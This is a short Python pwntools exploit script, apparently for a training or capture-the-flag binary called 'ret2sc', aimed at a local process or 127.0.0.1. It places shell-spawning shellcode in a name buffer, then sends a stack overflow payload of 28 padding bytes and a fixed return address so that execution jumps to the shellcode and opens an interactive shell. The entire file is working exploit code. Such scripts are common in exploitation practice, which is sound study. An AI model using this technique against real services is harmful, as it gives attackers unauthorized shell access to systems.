# -*- coding: utf-8 -*-
#!/usr/bin/env python2
from pwn import *
context.log_level = 'debug'
context.arch = 'x86' #amd64,x86
LOCAL = True
if LOCAL:
    p = process('ret2sc')
else:
    p = remote('127.0.0.1',10001)

def main():
    #name = 'aaaa';
    name = asm(shellcraft.sh());
    #payload = 'bbb';
    payload = 'b'*28+p32(0x0804A060);
    p.recvuntil('Name:')
    p.sendline(name)
    p.recvuntil('best:')
    gdb.attach()
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    main()
